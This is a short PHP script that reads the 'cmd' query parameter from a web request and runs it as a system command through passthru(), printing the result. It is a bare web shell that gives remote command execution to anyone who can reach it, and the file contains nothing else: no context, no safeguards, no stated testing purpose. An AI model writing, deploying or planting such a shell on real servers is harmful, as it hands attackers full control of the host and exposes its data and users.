<?php
function execute($com)
{
    echo passthru($com);
}

$cmd = $_GET['cmd'];
execute($cmd);
?>